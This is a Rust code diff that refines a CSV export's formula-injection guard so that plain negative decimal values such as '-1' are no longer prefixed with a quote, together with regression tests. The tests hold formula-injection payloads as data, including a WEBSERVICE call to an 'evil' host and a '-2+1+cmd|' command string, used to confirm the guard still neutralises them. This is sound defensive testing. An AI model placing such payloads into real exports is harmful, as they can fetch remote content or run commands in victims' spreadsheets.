@@ -43,10 +43,47 @@ pub fn default_csv_null_literal() -> String {
 /// `CsvEscapedWriter` 逐段写入，片段级 guard 会在 JSON 单元格中间插 `'`。
 const FORMULA_TRIGGER_BYTES: &[u8] = b"=+-@\t\r";
 
+/// Excel 数值列可保留的有效十进制数字位数上限：超过即被折成浮点丢失尾数。
+const EXCEL_SIGNIFICANT_DIGIT_LIMIT: usize = 15;
+
 /// 文本是否需要公式中和：跳过前导空格（OWASP 标注的 `" =cmd"` 前导空白绕过）
-/// 后，首字节是触发字符即命中。
+/// 后，首字节是触发字符即命中；唯一例外是 `-` 开头且**整串**构成 Excel 可无损
+/// 解析的十进制字面量的文本（见 [`is_excel_exact_decimal_literal`]）。
 pub fn needs_formula_guard(value: &str) -> bool {
-    value.bytes().find(|&byte| byte != b' ').is_some_and(|byte| FORMULA_TRIGGER_BYTES.contains(&byte))
+    let rest = value.trim_start_matches(' ');
+    match rest.as_bytes().first() {
+        Some(b'-') if is_excel_exact_decimal_literal(&rest[1..]) => false,
+        Some(byte) if FORMULA_TRIGGER_BYTES.contains(byte) => true,
+        _ => false,
+    }
+}
+
+/// 整串是否为 Excel 能原样保留的十进制字面量：`[+-]? 数字 [. 数字]`（无指数
+/// 记法、无千分位、无空白），有效数字不超过 15 位。
+///
+/// 驱动为保精度把 DECIMAL/NUMERIC/BIGINT 以文本下发（PostgreSQL numeric、
+/// MySQL DECIMAL/BIGINT 都返回字符串），负值因此以 `-` 开头命中触发符；这类
+/// 整串数值在电子表格里只会被解析成数字，不构成公式执行面，加 `'` 反而污染
+/// 复制内容（`-1` 变 `'-1`）。公式注入载荷（`-2+1+cmd|…`）因无法整串解析成
+/// 数字仍被中和。超过 15 位有效数字的（i64::MIN 一类大整数）不豁免：Excel
+/// 会把它折成浮点丢尾数，守卫维持文本语义才是无损的。
+///
+/// 仅 `-` 号豁免：`+` 开头的数字是电话号码等标识文本的常见形态（`+86138…`），
+/// Excel 会把它当数值吞掉前导加号与尾部精度，守卫保留文本。
+fn is_excel_exact_decimal_literal(value: &str) -> bool {
+    let bytes = value.as_bytes();
+    let digits = if matches!(bytes.first(), Some(b'+') | Some(b'-')) { &bytes[1..] } else { bytes };
+    match digits.iter().position(|&byte| byte == b'.') {
+        Some(dot) => is_exact_digit_run(&digits[..dot]) && is_exact_digit_run(&digits[dot + 1..]),
+        None => is_exact_digit_run(digits),
+    }
+}
+
+/// 整段是否为非空纯 ASCII 数字，且有效数字（去前导零）不超过 Excel 精度上限。
+fn is_exact_digit_run(bytes: &[u8]) -> bool {
+    !bytes.is_empty()
+        && bytes.iter().all(u8::is_ascii_digit)
+        && bytes.iter().skip_while(|&&byte| byte == b'0').count() <= EXCEL_SIGNIFICANT_DIGIT_LIMIT
 }
 
 /// 在单元格值开头写入公式中和前缀，每单元格调用一次：
@@ -707,9 +744,46 @@ mod tests {
                 vec![json!(-4)],
             ],
         );
+        // `-3` 是整串十进制字面量（驱动 DECIMAL/BIGINT 文本形态），豁免中和
         assert_eq!(
             out,
-            "\"cmd\"\n\"'=WEBSERVICE(\"\"https://evil\"\")\"\n\"'+2\"\n\"'-3\"\n\"'@x\"\n\"'\tlead\"\n\"safe\"\n\"-4\""
+            "\"cmd\"\n\"'=WEBSERVICE(\"\"https://evil\"\")\"\n\"'+2\"\n\"-3\"\n\"'@x\"\n\"'\tlead\"\n\"safe\"\n\"-4\""
+        );
+    }
+
+    #[test]
+    fn negative_decimal_text_cells_keep_their_plain_numeric_form() {
+        // 回归：DECIMAL/NUMERIC/BIGINT 负值以文本下发（PG numeric、MySQL DECIMAL
+        // 都返回字符串），曾因 `-` 触发符被写成 `'-1`，复制/导出内容被污染。
+        // 整串数字字面量豁免；超 15 位有效数字、`+` 号形态与注入载荷仍守卫。
+        let out = format_csv(
+            &["v".to_string()],
+            &[
+                vec![json!("-1")],
+                vec![json!("-123.45")],
+                vec![json!("-0.000000000000001")],
+                vec![json!(" -1")],
+                vec![json!("-9223372036854775808")],
+                vec![json!("+8613800000000")],
+                vec![json!("-2+1+cmd|'x'")],
+                vec![json!("-cmd")],
+            ],
+        );
+        assert_eq!(
+            out,
+            concat!(
+                "\"v\"\n",
+                "\"-1\"\n",
+                "\"-123.45\"\n",
+                "\"-0.000000000000001\"\n",
+                "\" -1\"\n",
+                // 19 位有效数字超出 Excel 15 位精度上限，按文本守卫防丢尾数
+                "\"'-9223372036854775808\"\n",
+                // `+` 号形态是电话号码类标识文本，守卫保留文本语义
+                "\"'+8613800000000\"\n",
+                "\"'-2+1+cmd|'x'\"\n",
+                "\"'-cmd\""
+            )
         );
     }
 
@@ -755,7 +829,7 @@ mod tests {
                 "\"[1,-2]\"\n",
                 "\"[\"\"-5\"\"]\"\n",
                 "\"{\"\"formula\"\":\"\"=1+1\"\"}\"\n",
-                "\"'-5\""
+                "\"-5\""
             )
         );
     }
